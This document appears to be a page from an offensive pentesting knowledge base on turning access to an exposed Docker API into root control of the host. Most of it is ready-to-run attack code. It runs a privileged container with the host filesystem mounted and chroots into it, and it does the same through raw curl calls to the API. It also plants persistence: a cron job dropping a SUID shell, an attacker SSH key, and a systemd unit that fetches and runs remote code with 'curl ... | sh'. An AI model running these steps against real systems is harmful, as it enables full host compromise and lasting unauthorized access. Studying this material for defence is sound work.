---
title: "Host takeover via privileged run: owning the host through a crafted container"
order: 2
description: "The decisive step after reaching the Docker API is to run a container that is privileged and bind-mounts the host root filesystem. That container is root on the host by construction, so chroot-ing into the mount, or writing a cron job, SSH key, or SUID binary through it, gives durable host compromise regardless of the current container's own restrictions."
keywords:
  - privileged container
  - host mount
  - docker run
  - host takeover
  - persistence
---

# Host takeover via privileged run

Reaching the Docker API is the access; running the right container is the takeover. The daemon runs as root on the host, so a container it creates with the host root bind-mounted and the privileged flag set is, in effect, a root shell on the host. This is the final step whether the API was reached unauthenticated on 2375, through weak TLS on 2376, or through a mounted socket inside another container.

## The decisive container

```bash
H=tcp://<target>:2375
# interactive host root
docker -H $H run -v /:/host --privileged --rm -it alpine chroot /host bash
```

Through the mount at `/host`, everything on the host is writable as root. Choose a persistence mechanism rather than only a shell:

```bash
# cron job that drops a SUID bash on the host
echo '* * * * * root cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /host/etc/cron.d/x
# attacker SSH key for the host root account
mkdir -p /host/root/.ssh && echo 'ssh-ed25519 AAAA... a' >> /host/root/.ssh/authorized_keys
# a systemd unit executed on next boot or reload
printf '[Service]\nExecStart=/bin/sh -c "curl http://a/c|sh"\n[Install]\nWantedBy=multi-user.target\n' \
  > /host/etc/systemd/system/x.service
```

## Raw API variant

Without the Docker CLI, create and start the same container over the HTTP API:

```bash
cid=$(curl -s -XPOST http://<target>:2375/containers/create \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["chroot","/host","sh","-c","id"],
       "HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  | sed 's/.*"Id":"\([^"]*\)".*/\1/')
curl -s -XPOST http://<target>:2375/containers/$cid/start
curl -s "http://<target>:2375/containers/$cid/logs?stdout=1&stderr=1"
```

## Exploitation notes

- Prefer a deterministic persistence write (cron, authorized_keys, systemd unit) over holding an interactive session, so access survives the container being removed.
- Reuse an image the daemon already has to avoid pulling; `docker -H $H images` lists them, and any Linux base works because you immediately operate on the host mount.
- A rootless daemon limits the mount to the invoking user's privileges; confirm with `docker -H $H info | grep -i rootless` and fall back to enumerating user-accessible secrets if so.
- The mechanism is identical to a mounted runtime socket; see [Runtime socket mount](../../../container-escape/sensitive-mounts/runtime-socket-mount.md) for the containerd and CRI-O equivalents.

## References

- [Docker Engine API: create a container](https://docs.docker.com/reference/api/engine/)
- [HackTricks: Docker API host takeover](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker)
